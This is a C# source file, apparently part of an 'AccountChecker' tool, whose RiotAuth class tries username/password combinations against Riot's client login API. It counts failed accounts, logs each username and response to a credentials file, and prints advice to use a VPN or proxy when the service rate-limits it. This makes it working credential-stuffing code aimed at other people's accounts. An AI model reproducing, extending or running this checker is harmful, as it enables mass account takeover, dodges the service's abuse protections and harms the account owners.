using AccountChecker.Models;
using AccountChecker.Utility;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AccountChecker.Connections;

public class RiotAuth
{
    private readonly RiotConnection _connection;
    private static readonly object _lock = new();
    private readonly Client _client;
    private readonly CoreUtility _coreUtility;

    public RiotAuth(RiotConnection connection, Client client)
    {
        lock (_lock)
        {
            _coreUtility = new();
            _client = client;
            _connection = connection;
        }
    }

    private async Task<bool> CanAuthenticateAsync(AccountCombo combo, int timeout = 8)
    {
        
        var data = new Dictionary<string, object>()
        {
            {"username", combo.Username},
            {"password", combo.Password},
            {"persistLogin", false},
        };

        while (timeout > 0)
        {
            var response = await _connection.RequestAsync(HttpMethod.Put, "/rso-auth/v1/session/credentials", data);
            var content = JToken.Parse(await response.Content.ReadAsStringAsync());


            if (response.IsSuccessStatusCode)
            {

                // Log response
                _coreUtility.LogToFile("Credentials_LOG.txt", $"{combo.Username} - {response.StatusCode} - \n{await response.Content.ReadAsStringAsync()}\n\n");

                if (content.SelectToken("error") != null)
                {
                    if (content["error"].ToString() == "auth_failure")
                    {
                        Main.FailAccounts += 1;
                        return false;
                    }

                    if (content["error"].ToString() == "rate_limited")
                    {
                        Console.WriteLine("Rate limited. Use VPN.");
                        return false;
                    }

                }

                if (content.SelectToken("errorCode") != null)
                {
                    if (content["errorCode"].ToString() == "RPC_ERROR")
                    {
                        Console.WriteLine("Riot Session error. Try again later.");
                        _client.CloseClients();
                        throw new Exception("Riot API Error. Try again in 5-10 minutes or use a VPN/Proxy");
                    }
                }

                return true;
            }
            
            Thread.Sleep(1500);
            timeout--;
            
        }

        return false;
    }

    private async void AcceptEULA(int timeout = 10)
    {
        while (timeout > 0)
        {
            var response = await _connection.RequestAsync(HttpMethod.Put, "/eula/v1/agreement/acceptance", null);

            if (response.IsSuccessStatusCode)
                return;

            Thread.Sleep(1000);
            timeout--;
        }
    }

    public async Task<bool> Login(AccountCombo combo)
    {

        bool canAuth = await CanAuthenticateAsync(combo);

        if (!canAuth)
            return false;

        AcceptEULA();

        return true;
    }

}
